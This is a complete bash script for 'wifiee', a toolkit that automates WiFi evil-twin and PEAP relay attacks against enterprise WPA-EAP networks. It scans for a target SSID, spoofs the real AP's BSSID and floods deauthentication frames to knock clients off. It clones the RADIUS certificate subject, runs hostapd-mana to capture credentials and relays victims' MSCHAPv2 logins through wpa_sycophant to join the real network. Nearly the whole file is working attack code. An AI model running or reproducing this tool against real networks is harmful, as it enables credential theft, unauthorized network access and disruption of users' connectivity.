#!/bin/bash
#
# wifiee — WiFi EAP Evil-twin & PEAP Relay Toolkit
#
# Automates rogue AP setup with hostapd-mana and wpa_sycophant for
# PEAP relay attacks. Handles scanning, BSSID spoofing, deauth,
# certificate cloning, and relay orchestration.
#
# Based on work by:
#   - 1mm0rt41PC (original wifi-relay concept)
#   - SensePost  (hostapd-mana, wpa_sycophant)
#
# Ref:
#   - https://github.com/sensepost/hostapd-mana
#   - https://github.com/sensepost/wpa_sycophant
#   - https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/
#
# Tested on:
#   - Kali Linux 2025/2026 (kernel 6.x, OpenSSL 3.x)
#   - MediaTek MT7921AU (Alfa AWUS036AXML)
#   - VMware Workstation USB passthrough + bare metal
#
# Usage:
#   sudo ./wifiee.sh
#   sudo ./wifiee.sh --ssid "CorpWiFi" --channel 6
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
set -e

##############################################################################
# CONFIGURATION
##############################################################################
# Override with CLI flags or edit here. Leave blank for interactive/auto mode.
IFACE_ROGUEAP="${IFACE_ROGUEAP:-wlan0}"
IFACE_RELAY="${IFACE_RELAY:-wlan1}"
SSID="${SSID:-}"                       # Target SSID — prompted if empty
BSSID="${BSSID:-}"                     # Leave empty for auto-scan
CHANNEL="${CHANNEL:-}"                 # Leave empty for auto-detect
HW_MODE="${HW_MODE:-}"                 # Leave empty for auto-detect (a=5GHz, g=2.4GHz)
COUNTRY="${COUNTRY:-US}"               # Regulatory domain (US, AU, GB, DE, etc.)
DEAUTH_COUNT="${DEAUTH_COUNT:-10}"     # Number of deauth bursts
DEAUTH_DELAY="${DEAUTH_DELAY:-3}"      # Seconds between bursts

# Certificate subject — auto-extracted from target AP if possible,
# otherwise uses this fallback. Edit to match target org for realism.
CERT_CN="${CERT_CN:-radius.corp.local}"
CERT_ORG="${CERT_ORG:-IT Department}"
CERT_SUBJECT="${CERT_SUBJECT:-/C=$COUNTRY/ST=State/L=City/O=$CERT_ORG/OU=IT/CN=$CERT_CN}"

##############################################################################
# CLI ARGUMENT PARSING
##############################################################################
while [[ $# -gt 0 ]]; do
	case "$1" in
		--ssid)       SSID="$2";           shift 2 ;;
		--bssid)      BSSID="$2";          shift 2 ;;
		--channel)    CHANNEL="$2";        shift 2 ;;
		--iface-ap)   IFACE_ROGUEAP="$2";  shift 2 ;;
		--iface-relay) IFACE_RELAY="$2";   shift 2 ;;
		--country)    COUNTRY="$2";        shift 2 ;;
		--cert-cn)    CERT_CN="$2";        shift 2 ;;
		--cert-org)   CERT_ORG="$2";       shift 2 ;;
		--deauth)     DEAUTH_COUNT="$2";   shift 2 ;;
		--no-deauth)  DEAUTH_COUNT=0;      shift   ;;
		--help|-h)
			echo "Usage: sudo ./wifiee.sh [OPTIONS]"
			echo ""
			echo "Options:"
			echo "  --ssid NAME         Target SSID (prompted if omitted)"
			echo "  --bssid MAC         Target BSSID (auto-scanned if omitted)"
			echo "  --channel N         Channel (auto-detected if omitted)"
			echo "  --iface-ap IFACE    Rogue AP interface (default: wlan0)"
			echo "  --iface-relay IFACE Relay interface (default: wlan1)"
			echo "  --country CC        Regulatory domain (default: US)"
			echo "  --cert-cn CN        Fake RADIUS cert CN (default: radius.corp.local)"
			echo "  --cert-org ORG      Fake RADIUS cert Org (default: IT Department)"
			echo "  --deauth N          Deauth burst count (default: 10)"
			echo "  --no-deauth         Skip deauth phase"
			echo "  -h, --help          Show this help"
			exit 0 ;;
		*) echo "Unknown option: $1"; exit 1 ;;
	esac
done

##############################################################################
# PATHS
##############################################################################
WORK_DIR="$(pwd)/wifiee-data"
mkdir -p "$WORK_DIR"
DH_FILE="$WORK_DIR/hostapd-mana.dh"
EAP_USER="$WORK_DIR/hostapd-mana.eap_user"
CERT="$WORK_DIR/hostapd-mana"

# Detect hostapd-mana binary
if command -v hostapd-mana &>/dev/null; then
	HOSTAPD_BIN="$(command -v hostapd-mana)"
elif [ -f "$WORK_DIR/hostapd-mana" ]; then
	HOSTAPD_BIN="$WORK_DIR/hostapd-mana"
else
	HOSTAPD_BIN=""
fi


##############################################################################
# HELPERS
##############################################################################
RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[1;33m'
CYN='\033[0;36m'
BLD='\033[1m'
NC='\033[0m'

function banner {
	echo -e "${CYN}"
	echo '  ╦ ╦╦╔═╗╦╔═╗╔═╗'
	echo '  ║║║║╠╣ ║║╣ ║╣ '
	echo '  ╚╩╝╩╚  ╩╚═╝╚═╝'
	echo -e "  ${NC}${BLD}WiFi EAP Evil-twin & PEAP Relay${NC}"
	echo ""
}

function prnt {
	echo -e "\n${GRN}*******************************************************************************${NC}"
	echo -e "${GRN}[*] $1${NC}"
	echo -e "${GRN}*******************************************************************************${NC}"
}

function err {
	echo -e "${RED}[!] ERROR: $1${NC}" >&2
	exit 1
}

function warn {
	echo -e "${YLW}[!] WARNING: $1${NC}"
}

function freq_to_channel {
	local freq=$1
	if [ "$freq" -ge 5000 ] 2>/dev/null; then
		echo $(( (freq - 5000) / 5 ))
	elif [ "$freq" -ge 2412 ] 2>/dev/null; then
		echo $(( (freq - 2407) / 5 ))
	else
		echo "0"
	fi
}


##############################################################################
# BSSID AUTO-SCAN
##############################################################################
function scan_for_target {
	local iface="$1"
	local target_ssid="$2"

	prnt "Scanning for '$target_ssid' on $iface"
	ip link set "$iface" up 2>/dev/null
	sleep 1

	# Run scan (may need a couple of attempts)
	iw dev "$iface" scan 2>/dev/null > "$WORK_DIR/scan_results.txt" || true
	sleep 2
	iw dev "$iface" scan 2>/dev/null > "$WORK_DIR/scan_results.txt" || true

	# Parse scan results for target SSID
	local results=""
	local current_bssid=""
	local current_freq=""
	local current_signal=""
	local count=0

	while IFS= read -r line; do
		if [[ "$line" =~ ^BSS\ ([0-9a-f:]+) ]]; then
			if [ -n "$current_bssid" ] && [ -n "$matched" ]; then
				count=$((count + 1))
				local ch=$(freq_to_channel "$current_freq")
				results+="  $count) BSSID=$current_bssid  CH=$ch  FREQ=${current_freq}MHz  SIGNAL=${current_signal}dBm\n"
				eval "SCAN_BSSID_$count='$current_bssid'"
				eval "SCAN_FREQ_$count='$current_freq'"
				eval "SCAN_CH_$count='$ch'"
			fi
			current_bssid="${BASH_REMATCH[1]}"
			current_freq=""
			current_signal=""
			matched=""
		fi
		[[ "$line" =~ freq:\ ([0-9]+) ]] && current_freq="${BASH_REMATCH[1]}"
		[[ "$line" =~ signal:\ ([-0-9.]+) ]] && current_signal="${BASH_REMATCH[1]}"
		[[ "$line" =~ SSID:\ ${target_ssid}$ ]] && matched=1
	done < "$WORK_DIR/scan_results.txt"

	# Last entry
	if [ -n "$current_bssid" ] && [ -n "$matched" ]; then
		count=$((count + 1))
		local ch=$(freq_to_channel "$current_freq")
		results+="  $count) BSSID=$current_bssid  CH=$ch  FREQ=${current_freq}MHz  SIGNAL=${current_signal}dBm\n"
		eval "SCAN_BSSID_$count='$current_bssid'"
		eval "SCAN_FREQ_$count='$current_freq'"
		eval "SCAN_CH_$count='$ch'"
	fi

	if [ "$count" -eq 0 ]; then
		warn "No APs found broadcasting '$target_ssid'"
		warn "Make sure you're in range of the target network."
		echo ""
		read -p "  Enter BSSID manually: " manual_bssid
		[ -z "$manual_bssid" ] && err "BSSID required. Cannot continue."
		BSSID="$manual_bssid"
		read -p "  Enter channel: " manual_ch
		[ -z "$manual_ch" ] && err "Channel required. Cannot continue."
		CHANNEL="$manual_ch"
		if [ "$CHANNEL" -ge 36 ] 2>/dev/null; then HW_MODE=a; else HW_MODE=g; fi
		return
	fi

	echo ""
	echo -e "${GRN}  Found $count AP(s) broadcasting '$target_ssid':${NC}"
	echo ""
	echo -e "$results"

	if [ "$count" -eq 1 ]; then
		BSSID="$SCAN_BSSID_1"
		CHANNEL="$SCAN_CH_1"
		echo "[+] Auto-selected: BSSID=$BSSID CH=$CHANNEL"
	else
		echo ""
		read -p "  Select target (1-$count): " selection
		if [ -z "$selection" ] || [ "$selection" -lt 1 ] || [ "$selection" -gt "$count" ] 2>/dev/null; then
			selection=1
		fi
		eval "BSSID=\$SCAN_BSSID_$selection"
		eval "CHANNEL=\$SCAN_CH_$selection"
		echo "[+] Selected: BSSID=$BSSID CH=$CHANNEL"
	fi

	# Auto-detect hw_mode from channel
	if [ "$CHANNEL" -ge 36 ] 2>/dev/null; then HW_MODE=a; else HW_MODE=g; fi
	echo "[+] Mode: hw_mode=$HW_MODE ($([ "$HW_MODE" = "a" ] && echo "5GHz" || echo "2.4GHz"))"
}


##############################################################################
# DEAUTH BURST
##############################################################################
function run_deauth_burst {
	local iface="$1"
	local target_bssid="$2"
	local target_channel="$3"
	local count="${4:-$DEAUTH_COUNT}"

	prnt "Deauth burst — $count rounds against $target_bssid (CH $target_channel)"
	echo "[*] Forcing clients off the real AP so they reconnect to ours"
	echo ""

	local mon_iface="${iface}mon"

	if command -v airmon-ng &>/dev/null; then
		airmon-ng check kill 2>/dev/null || true
		sleep 1
		airmon-ng start "$iface" 2>/dev/null

		if ip link show "$mon_iface" &>/dev/null; then
			:
		elif ip link show "$iface" &>/dev/null && iw dev "$iface" info 2>/dev/null | grep -q monitor; then
			mon_iface="$iface"
		else
			warn "Could not start monitor mode on $iface"
			return 1
		fi

		iw dev "$mon_iface" set channel "$target_channel" 2>/dev/null || true

		echo "[*] Sending deauth frames on $mon_iface..."
		for i in $(seq 1 "$count"); do
			echo -n "  Burst $i/$count... "
			aireplay-ng -0 5 -a "$target_bssid" "$mon_iface" 2>/dev/null || true
			echo "done"
			[ "$i" -lt "$count" ] && sleep "$DEAUTH_DELAY"
		done

		airmon-ng stop "$mon_iface" 2>/dev/null || true
		sleep 1
		systemctl restart NetworkManager 2>/dev/null || true
		sleep 2

	elif command -v mdk4 &>/dev/null; then
		ip link set "$iface" down 2>/dev/null
		iw dev "$iface" set type monitor 2>/dev/null || {
			warn "Cannot set monitor mode — skipping deauth"
			iw dev "$iface" set type managed 2>/dev/null
			ip link set "$iface" up 2>/dev/null
			return 1
		}
		ip link set "$iface" up
		iw dev "$iface" set channel "$target_channel" 2>/dev/null || true

		echo "[*] Sending deauth via mdk4 (10 seconds)..."
		timeout 10 mdk4 "$iface" d -B "$target_bssid" -c "$target_channel" 2>/dev/null || true

		ip link set "$iface" down
		iw dev "$iface" set type managed 2>/dev/null
		ip link set "$iface" up
		sleep 1

	elif python3 -c "from scapy.all import *" 2>/dev/null; then
		ip link set "$iface" down 2>/dev/null
		iw dev "$iface" set type monitor 2>/dev/null || {
			warn "Cannot set monitor mode — skipping deauth"
			iw dev "$iface" set type managed 2>/dev/null
			ip link set "$iface" up 2>/dev/null
			return 1
		}
		ip link set "$iface" up
		iw dev "$iface" set channel "$target_channel" 2>/dev/null || true

		echo "[*] Sending deauth via scapy..."
		python3 -c "
from scapy.all import *
iface='$iface'
bssid='$target_bssid'
pkt = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
for i in range($count):
    sendp(pkt, iface=iface, count=30, inter=0.01, verbose=False)
    print(f'  Burst {i+1}/$count done')
    if i < $count - 1:
        import time; time.sleep($DEAUTH_DELAY)
" 2>/dev/null || warn "Scapy deauth failed"

		ip link set "$iface" down
		iw dev "$iface" set type managed 2>/dev/null
		ip link set "$iface" up
		sleep 1
	else
		warn "No deauth tool found (need aircrack-ng, mdk4, or python3-scapy)"
		warn "Install with: apt install aircrack-ng mdk4"
		return 1
	fi

	echo "[+] Deauth burst complete"
	ip link set "$iface" up 2>/dev/null
	sleep 1
}


##############################################################################
# MAIN
##############################################################################
banner

# Must be root
[ "$(id -u)" -ne 0 ] && err "This script must be run as root (sudo)"

# Prompt for SSID if not set
if [ -z "$SSID" ]; then
	echo ""
	read -p "  Enter target SSID: " SSID
	[ -z "$SSID" ] && err "SSID is required"
fi


##############################################################################
# PRE-FLIGHT CHECKS
##############################################################################
prnt 'Running pre-flight checks'

ip link show "$IFACE_ROGUEAP" &>/dev/null || err "Interface $IFACE_ROGUEAP not found. Check USB passthrough."
ip link show "$IFACE_RELAY" &>/dev/null || err "Interface $IFACE_RELAY not found. Need two wireless adapters."

PHY_ROGUEAP=$(iw dev "$IFACE_ROGUEAP" info 2>/dev/null | grep wiphy | awk '{print "phy"$2}')
PHY_RELAY=$(iw dev "$IFACE_RELAY" info 2>/dev/null | grep wiphy | awk '{print "phy"$2}')

[ -z "$PHY_ROGUEAP" ] && err "Cannot determine phy for $IFACE_ROGUEAP"
[ -z "$PHY_RELAY" ] && err "Cannot determine phy for $IFACE_RELAY"

echo "[+] $IFACE_ROGUEAP -> $PHY_ROGUEAP (rogue AP)"
echo "[+] $IFACE_RELAY -> $PHY_RELAY (relay)"

if ! iw phy "$PHY_ROGUEAP" info 2>/dev/null | grep -q '\* AP$'; then
	warn "$IFACE_ROGUEAP ($PHY_ROGUEAP) does not advertise AP mode!"
	warn "Consider swapping interfaces (--iface-ap / --iface-relay)"
	read -p "  Continue anyway? [y/N] " confirm
	[[ "$confirm" != [yY] ]] && exit 1
fi
echo "[+] $IFACE_ROGUEAP supports AP mode"

rfkill unblock all 2>/dev/null || true
echo "[+] rfkill: all wireless unblocked"


##############################################################################
# SCAN FOR TARGET
##############################################################################
if [ -z "$BSSID" ]; then
	scan_for_target "$IFACE_RELAY" "$SSID"
fi
[ -z "$BSSID" ] && err "BSSID is required. Provide via --bssid or ensure target is in range."
[ -z "$CHANNEL" ] && err "Channel is required. Provide via --channel."
[ -z "$HW_MODE" ] && { [ "$CHANNEL" -ge 36 ] 2>/dev/null && HW_MODE=a || HW_MODE=g; }

REAL_AP_BSSID="$BSSID"
ORIGINAL_CHANNEL="$CHANNEL"


##############################################################################
# BSSID MODE
##############################################################################
prnt 'BSSID mode'
echo "  1) Spoof real AP BSSID  ($BSSID)"
echo "  2) Random BSSID         (avoids TX collision — try if probe_req fails)"
echo "  3) Custom BSSID"
echo ""
read -p "  Select [1]: " bssid_mode
case "$bssid_mode" in
	2)
		BSSID=$(printf '02:%02x:%02x:%02x:%02x:%02x' \
			$((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
		echo "[+] Random BSSID: $BSSID"
		;;
	3)
		read -p "  Enter BSSID (xx:xx:xx:xx:xx:xx): " custom_bssid
		BSSID="${custom_bssid:-$BSSID}"
		echo "[+] Custom BSSID: $BSSID"
		;;
	*)
		echo "[+] Spoofing real AP: $BSSID"
		;;
esac


##############################################################################
# CHANNEL OVERRIDE
##############################################################################
if [ "$HW_MODE" = "a" ]; then
	echo ""
	echo "  Target is on 5GHz (channel $CHANNEL)."
	echo "  Some drivers struggle with 5GHz AP mode under VMware."
	read -p "  Broadcast rogue AP on 2.4GHz channel 6 instead? [y/N]: " use_24ghz
	if [[ "$use_24ghz" == [yY] ]]; then
		CHANNEL=6
		HW_MODE=g
		echo "[+] Rogue AP: 2.4GHz channel $CHANNEL"
		echo "[+] Deauth will still target real AP on channel $ORIGINAL_CHANNEL"
	fi
fi

export SSID BSSID CHANNEL HW_MODE COUNTRY


##############################################################################
# INSTALL DEPENDENCIES
##############################################################################
prnt 'Checking dependencies'

if [ -z "$HOSTAPD_BIN" ]; then
	echo "[*] hostapd-mana not found, installing..."
	apt-get update -qq
	apt-get install -y hostapd-mana || err "Failed to install hostapd-mana"
	HOSTAPD_BIN="$(command -v hostapd-mana)"
fi
echo "[+] hostapd-mana: $HOSTAPD_BIN"

if [ ! -f "$WORK_DIR/wpa_supplicant/wpa_supplicant" ] || [ ! -f "$WORK_DIR/wpa_sycophant.sh" ]; then
	prnt 'Building wpa_sycophant'
	apt-get install -y build-essential libssl-dev libnl-3-dev libnl-genl-3-dev pkg-config git 2>/dev/null || true
	cd "$WORK_DIR"
	[ -d wpa_sycophant_src ] && rm -rf wpa_sycophant_src
	git clone https://github.com/sensepost/wpa_sycophant.git wpa_sycophant_src
	cd wpa_sycophant_src/wpa_supplicant/
	cp defconfig .config
	echo 'CFLAGS += -I/usr/include/libnl3' >> .config
	echo 'CONFIG_LIBNL32=y' >> .config
	make -j$(nproc)
	mkdir -p "$WORK_DIR/wpa_supplicant/"
	cp wpa_supplicant "$WORK_DIR/wpa_supplicant/"
	cp ../wpa_sycophant.sh "$WORK_DIR/"
	chmod +x "$WORK_DIR/wpa_sycophant.sh"
	cd "$WORK_DIR"
	rm -rf wpa_sycophant_src

	# Patch sycophant wrapper to use nl80211
	if grep -q 'wpa_supplicant -i' "$WORK_DIR/wpa_sycophant.sh"; then
		sed -i 's|wpa_supplicant -i|wpa_supplicant -D nl80211 -i|g' "$WORK_DIR/wpa_sycophant.sh"
		echo "[+] Patched wpa_sycophant.sh for nl80211"
	fi
fi
echo "[+] wpa_sycophant: $WORK_DIR/wpa_supplicant/wpa_supplicant"


##############################################################################
# CERTIFICATE
##############################################################################
prnt 'Generating certificates'

[ ! -f "$DH_FILE" ] && openssl dhparam -out "$DH_FILE" 2048

if [ ! -f "$CERT.key" ] || [ ! -f "$CERT.crt" ]; then
	# Probe the real AP to extract RADIUS cert subject
	cat <<EOD > "$WORK_DIR/wpa_supplicant.conf"
p2p_disabled=1
ctrl_interface=/var/run/wpa_supplicant_probe

network={
  ssid="$SSID"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="probe"
  password="probe"
  eap=PEAP
  phase1="crypto_binding=0 peaplabel=0"
  phase2="auth=MSCHAPV2"
}
EOD

	ip link set "$IFACE_ROGUEAP" up
	echo "[*] Probing target AP for RADIUS certificate (45s)..."
	timeout 50 wpa_supplicant -D nl80211 -i "$IFACE_ROGUEAP" \
		-c "$WORK_DIR/wpa_supplicant.conf" 2>&1 | tee "$WORK_DIR/wpa_supplicant.log" &
	WPA_PID=$!
	sleep 45
	kill -9 $WPA_PID 2>/dev/null || true
	wait $WPA_PID 2>/dev/null || true

	EXTRACTED_SUBJECT=$(grep -E 'subject=' "$WORK_DIR/wpa_supplicant.log" 2>/dev/null \
		| head -n1 | sed -E "s/.+subject='([^']+)'.+/\1/g")

	if [ -n "$EXTRACTED_SUBJECT" ]; then
		CERT_SUBJECT="$EXTRACTED_SUBJECT"
		echo "[+] Extracted cert subject: $CERT_SUBJECT"
	else
		warn "Could not extract RADIUS cert — using configured default"
	fi

	openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
		-keyout "$CERT.key" -out "$CERT.crt" -subj "$CERT_SUBJECT" 2>/dev/null
	echo "[+] Certificate generated"
fi

iw reg set "$COUNTRY"


##############################################################################
# HOSTAPD-MANA CONFIG
##############################################################################
prnt 'Configuring hostapd-mana'

cat <<EOD > "$WORK_DIR/hostapd.conf"
driver=nl80211
interface=$IFACE_ROGUEAP
ssid=$SSID
bssid=$BSSID
channel=$CHANNEL
hw_mode=$HW_MODE
country_code=$COUNTRY

ieee80211n=1
ieee80211ac=1
ieee80211w=0

ignore_broadcast_ssid=0
max_num_sta=255
rts_threshold=2347
fragm_threshold=2346
dtim_period=1
beacon_int=100

ctrl_interface=$WORK_DIR/hostapd-ctrl.run
ctrl_interface_group=0

logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
macaddr_acl=0

auth_algs=3
wpa=2
wpa_pairwise=TKIP CCMP

mana_wpe=1
enable_sycophant=1
sycophant_dir=/tmp/
eap_user_file=$EAP_USER
eap_server=1
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd-wpe
eap_fast_prov=3
ieee8021x=1
pac_key_lifetime=604800
pac_key_refresh_time=86400
pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f
wpa_key_mgmt=WPA-EAP
dh_file=$DH_FILE
server_cert=$CERT.crt
private_key=$CERT.key
EOD

cat <<'EOD' > "$EAP_USER"
# Phase 1
*	PEAP,TTLS,TLS,FAST
"t"	GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5	"t" [2]

# Phase 2
"t-md5"	MD5	"password"	[2]
"DOMAIN\t-mschapv2"	MSCHAPV2	"password"	[2]
"t-gtc"	GTC	"password"	[2]
EOD

echo "[+] hostapd.conf written"


##############################################################################
# WPA_SYCOPHANT CONFIG
##############################################################################
prnt 'Configuring wpa_sycophant'

cat <<EOD > "$WORK_DIR/wpa_sycophant.conf"
p2p_disabled=1
ctrl_interface=/var/run/wpa_sycophant

network={
  ssid="$SSID"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity=""
  anonymous_identity=""
  password=""
  eap=PEAP
  phase1="crypto_binding=0 peaplabel=0"
  phase2="auth=MSCHAPV2"
  bssid_blacklist=$BSSID
}
EOD

echo "[+] wpa_sycophant.conf written"


##############################################################################
# BRING UP INTERFACES
##############################################################################
prnt 'Bringing up interfaces'

rfkill unblock all 2>/dev/null || true
ip link set "$IFACE_ROGUEAP" up || err "Failed to bring up $IFACE_ROGUEAP"
ip link set "$IFACE_RELAY" up || err "Failed to bring up $IFACE_RELAY"

echo "[+] $IFACE_ROGUEAP: UP"
echo "[+] $IFACE_RELAY: UP"


##############################################################################
# LAUNCH
##############################################################################
prnt 'Starting PEAP relay attack'
echo "[*] Rogue AP : $IFACE_ROGUEAP -> SSID=$SSID  BSSID=$BSSID  CH=$CHANNEL"
echo "[*] Real AP  : $REAL_AP_BSSID  CH=$ORIGINAL_CHANNEL"
echo "[*] Relay    : $IFACE_RELAY -> sycophant"
echo ""
echo "[*] Captured creds will appear in this terminal (MANA WPE output)"
echo "[*] Press Ctrl+C to stop"
echo ""

# Deauth burst
if [ "$DEAUTH_COUNT" -gt 0 ] 2>/dev/null; then
	echo ""
	echo "  Deauth will temporarily put $IFACE_RELAY into monitor mode,"
	echo "  send frames against $REAL_AP_BSSID (CH $ORIGINAL_CHANNEL),"
	echo "  then restore managed mode for the relay."
	echo ""
	read -p "  Run deauth burst now? [Y/n]: " do_deauth
	if [[ "$do_deauth" != [nN] ]]; then
		run_deauth_burst "$IFACE_RELAY" "$REAL_AP_BSSID" "$ORIGINAL_CHANNEL"
		ip link set "$IFACE_RELAY" up 2>/dev/null
		sleep 2
	fi
fi

# Start sycophant relay
SYCO_LOG="$WORK_DIR/sycophant.log"
if command -v xterm &>/dev/null; then
	xterm -title "wpa_sycophant [$IFACE_RELAY]" -e \
		"$WORK_DIR/wpa_sycophant.sh" -c "$WORK_DIR/wpa_sycophant.conf" -i "$IFACE_RELAY" &
	SYCOPHANT_PID=$!
	echo "[+] Sycophant started in xterm (PID: $SYCOPHANT_PID)"
else
	warn "xterm not found — running sycophant in background (apt install xterm)"
	"$WORK_DIR/wpa_sycophant.sh" -c "$WORK_DIR/wpa_sycophant.conf" -i "$IFACE_RELAY" \
		> "$SYCO_LOG" 2>&1 &
	SYCOPHANT_PID=$!
	echo "[+] Sycophant in background (PID: $SYCOPHANT_PID)"
	echo "[+] Monitor: tail -f $SYCO_LOG"
fi

# Cleanup on exit
trap "echo ''; echo '[*] Shutting down...'; kill $SYCOPHANT_PID 2>/dev/null; \
ip link set $IFACE_ROGUEAP down 2>/dev/null; ip link set $IFACE_RELAY down 2>/dev/null; \
echo '[*] Done.'; exit 0" INT TERM

# Start hostapd-mana in foreground
"$HOSTAPD_BIN" "$WORK_DIR/hostapd.conf"
